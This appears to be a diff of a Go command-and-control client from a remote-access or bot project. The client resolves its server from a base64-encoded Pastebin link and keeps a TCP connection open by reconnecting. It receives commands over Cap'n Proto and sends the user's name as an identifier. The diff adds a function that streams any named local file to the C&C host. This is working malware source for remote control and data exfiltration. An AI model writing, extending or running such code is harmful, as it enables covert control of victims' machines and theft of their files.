@@ -5,9 +5,14 @@ import (
 	"fmt"
 	"io"
 	"io/ioutil"
+	"log"
 	"net"
 	"net/http"
+	"os"
 	"strings"
+	"time"
+
+	capnp "zombiezen.com/go/capnproto2"
 
 	"../base64"
 	"../utils"
@@ -28,11 +33,14 @@ func Connect() {
 	Connection, _ = net.Dial("tcp", ip)
 }
 
+// Reconnect renews te connection every 10 minutes (To be inproved)
+// TODO add automatic reconection when connection dies
 func Reconnect() {
 	//Every 10 mins
 	for {
 		utils.Wait(60 * 10)
 		Connect()
+
 	}
 }
 
@@ -44,7 +52,7 @@ func getIPTor() string {
 	return strings.TrimLeft(strings.TrimSpace(string(respBody)), "tcp://")
 }
 
-func getIp() string {
+func getIP() string {
 	resp, _ := http.Get(base64.Base64Decode("aHR0cDovL3Bhc3RlYmluLmNvbS9yYXcvQnVHOTdCU2s="))
 	defer resp.Body.Close()
 	respBody, _ := ioutil.ReadAll(resp.Body)
@@ -52,17 +60,18 @@ func getIp() string {
 	return strings.TrimLeft(string(respBody), "tcp://")
 }
 
+// Send writes to te connection a string using deprecadet method
 func Send(pre string, msg string) {
 	Connection.Write([]byte(pre + "|" + msg)) //var c is located in client.go
 }
 
-/*func ReciveCommand() (cmd string, target string, args string, date int64) {
-	msg, err := capnp.NewDecoder(c).Decode()
+func ReciveCommand() (cmd string, target string, args string, date int64) {
+	msg, err := capnp.NewDecoder(Connection).Decode()
 	if err != nil {
 		panic(err)
 	}
 	// Extract the root struct from the message.
-	commad, err := network.ReadRootCommand(msg)
+	commad, err := ReadRootCommand(msg)
 	if err != nil {
 		panic(err)
 	}
@@ -75,6 +84,7 @@ func Send(pre string, msg string) {
 	return
 }
 
+// SendData is the new protocol to send to the C&C Host using capn'p
 func SendData(data string) {
 	msg, seg, err := capnp.NewMessage(capnp.SingleSegment(nil))
 	if err != nil {
@@ -82,23 +92,36 @@ func SendData(data string) {
 	}
 
 	// Create a newclient. Book struct.  Every message must have a root struct.
-	cnp, err := network.NewRootCommand(seg)
+	cnp, err := NewRootCommand(seg)
 	if err != nil {
 		panic(err)
 	}
 	// id
-	cnp.SetCmd(GetUsername())
+	cnp.SetCmd(utils.GetUsername())
 	//Target blanc
 	cnp.SetTarget("")
 	// Data
 	cnp.SetArgs(data)
 	cnp.SetDate(time.Now().Unix()) // Set int date
-	err = capnp.NewEncoder(c).Encode(msg)
+	err = capnp.NewEncoder(Connection).Encode(msg)
 	if err != nil {
 		panic(err)
 	}
 }
-*/
+
+// SendFile Sends a file given its path
+// TODO add tag so server nows what's comming
+func SendFile(fileName string) {
+	file, err := os.Open(fileName) // For read access.
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer file.Close() // make sure to close the file even if we panic.
+	_, err = io.Copy(Connection, file)
+	if err != nil {
+		log.Fatal(err)
+	}
+}
 
 func SendBig(data io.Reader) {
 	io.Copy(Connection, data)
